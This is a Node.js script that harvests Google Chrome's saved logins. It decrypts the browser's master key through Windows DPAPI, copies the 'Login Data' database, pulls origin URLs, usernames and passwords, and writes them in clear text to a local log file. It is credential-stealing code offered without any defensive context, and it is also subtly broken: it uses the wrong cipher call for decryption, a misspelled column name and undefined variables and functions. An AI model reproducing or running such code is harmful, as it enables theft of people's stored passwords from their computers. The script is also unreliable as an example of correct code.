import { Dpapi } from "@primno/dpapi";
import fs from "fs/promises";
import path from "path";
import sqlite3 from "sqlite3";
import crypto from "crypto";

const getEncryptionKey = async () => {
    const localStatePath = path.join(
        process.env.USERPROFILE,
        "AppData",
        "Local",
        "Google",
        "Chrome",
        "User Data",
        "Local State"
    );

    const localStateData = await fs.readFile(localStatePath, "utf-8");
    const localState = JSON.parse(localStateData);

    const encryptedKey = localState["os_crypt"]["encrypted_key"];
    const keyBuffer = Buffer.from(encryptedKey, "base64"); // Decode from Base64
    const bufferkey = keyBuffer.slice(5); // Remove DPAPI string

    const decrypted = Dpapi.unprotectData(bufferkey, null, "CurrentUser");

    console.log("encrypted key is : ", decrypted);
    console.log(Buffer.byteLength(decrypted, "utf8"));

    return decrypted;
};

const decryptPassword = async (password, key) => {
    try {
        // Attempt AES decryption with GCM mode (Node.js equivalent)
        console.log("password is : ", password);
        const iv = password.slice(3, 15);
        password = password.slice(15);
        const cipher = crypto.createCipheriv("aes-256-gcm", key, iv);
        const decrypted =
            cipher.update(password, "binary", "utf8") + cipher.final("utf8");
        return decrypted.slice(0, -16); // Remove authentication tag
    } catch (error) {
        console.log("error is occured ---------", err);
        try {
            // Fallback to CryptUnprotectData (assuming Electron for Windows compatibility)
            const decrypted = Dpapi.unprotectData(
                password,
                null,
                "CurrentUser"
            );
            return decrypted.data;
        } catch (error) {
            console.error("Decryption failed with both methods:", error);
            return "";
        }
    }
};

const writeToOutputFile = async (data) => {
    try {
        // Create the file or overwrite it if it exists
        await fs.writeFile(outputfilename, data, "utf8");
        console.log("Output written to p.txt successfully.");
    } catch (error) {
        console.error("Error writing to file:", error);
    }
};

// Local sqlite Chrome database path
const dbPath = path.join(
    process.env.USERPROFILE,
    "AppData",
    "Local",
    "Google",
    "Chrome",
    "User Data",
    "default",
    "Login Data"
);

console.log("dbPath is : ", dbPath);

// Copy the file (handle potential errors)
const filename = "db.log";
const outputfilename = "p.log";
try {
    await fs.copyFile(dbPath, filename);
} catch (error) {
    console.error("Error copying database file:", error);
}

// Connect to the database
const db = new sqlite3.Database(filename);
let output = "";

db.all(
    `SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins`,
    async (err, rows) => {
        console.log(rows.length);
        for (const row of rows) {
            const originUrl = row.origin_url;
            const actionUrl = row.action_url;
            const username = row.username_value;
            const key = await getEncryptionKey();
            console.log("key is ", key.toString());
            const password = await decryptPassword(row.password_value, key); // Assuming decrypt_password exists
            const dateCreated = row.data_created;
            const dateLastUsed = row.data_last_used;
            if (username) {
                output += `Origin URL: ${originUrl}\n`;
                output += `Action URL: ${actionUrl}\n`;
                output += `Username: ${username}\n`;
                output += `Password: ${password}\n`;
                // console.log(`Origin URL: ${originUrl}`);
                // console.log(`Action URL: ${actionUrl}`);
                // console.log(`Username: ${username}`);
                // console.log(`Password: ${password}`);
            } else {
                continue;
            }
            if (dateCreated !== 86400000000 && dateCreated) {
                // console.log(
                //     `Creation date: ${get_chrome_datetime(dateCreated)}`
                // ); // Assuming function exists
                output += `Creation date: ${get_chrome_datetime(
                    dateCreated
                )}\n`; // Assuming function exists
            }
            if (dateLastUsed !== 86400000000 && dateLastUsed) {
                // console.log(`Last Used: ${get_chrome_datetime(dateLastUsed)}`); // Assuming function exists
                output += `Last Used: ${get_chrome_datetime(dateLastUsed)}\n`; // Assuming function exists
            }
            // console.log("*".repeat(50));
            output += "*".repeat(50) + "\n"; // Add separator and newline
        }
        await writeToOutputFile(output); // Write accumulated output to file
    }
);

console.log("output is : ", output);

db.close(async (err) => {
    if (err) {
        console.error("Error closing database connection:", err);
    } else {
        try {
            await fs.unlink(filename);
        } catch (error) {
            console.error("Error removing copied database file:", error);
        }
    }
});
